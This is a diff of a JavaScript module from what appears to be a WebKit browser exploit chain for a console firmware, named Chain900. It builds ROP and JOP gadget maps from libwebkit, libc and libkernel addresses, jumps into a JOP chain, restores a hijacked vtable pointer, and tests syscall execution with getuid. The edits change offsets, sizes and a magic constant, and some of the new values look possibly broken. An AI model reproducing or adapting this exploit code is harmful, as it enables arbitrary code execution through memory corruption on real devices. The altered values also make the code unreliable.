@@ -20,7 +20,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 import * as config from '../config.mjs';
 
 import { Int } from '../module/int64.mjs';
-import { debug_log, align, die } from '../module/utils.mjs';
+import { debug_log, die } from '../module/utils.mjs';
 import { Addr, mem } from '../module/mem.mjs';
 import { KB, MB } from '../module/constants.mjs';
 import { ChainBase } from '../module/chain.mjs';
@@ -535,7 +535,7 @@ class Chain900 extends Chain900Base {
         // jump to JOP chain
         this.textarea.scrollLeft;
         // restore vtable
-        this.webcore_ta.write64(1, this.old_vtable_p);
+        this.webcore_ta.write64(0, this.old_vtable_p);
     }
 }
 const Chain = Chain900;
@@ -545,7 +545,7 @@ function init(Chain) {
 
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
     init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
-    init_syscall_array(syscall_array, libkernel_base, 550 * KB);
+    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
     debug_log('syscall_array:');
     debug_log(syscall_array);
     Chain.init_class(gadgets, syscall_array);
@@ -619,7 +619,7 @@ function test_rop(Chain) {
         die('if branch not taken');
     }
 
-    const state2 = new Uint8Array(9);
+    const state2 = new Uint8Array(8);
     debug_log('test if rax != 0');
     chain.clean();
 
@@ -655,7 +655,7 @@ function test_rop(Chain) {
     chain.clean();
     // Set the return value to some random value. If the syscall worked, then
     // it will likely change.
-    const magic = 0x4b4355467;
+    const magic = 0x4b435546;
     rw.write32(chain._return_value, 0, magic);
 
     chain.syscall('getuid');
@@ -666,4 +666,5 @@ function test_rop(Chain) {
     }
 }
 
+debug_log('Chain900');
 test_rop(Chain);
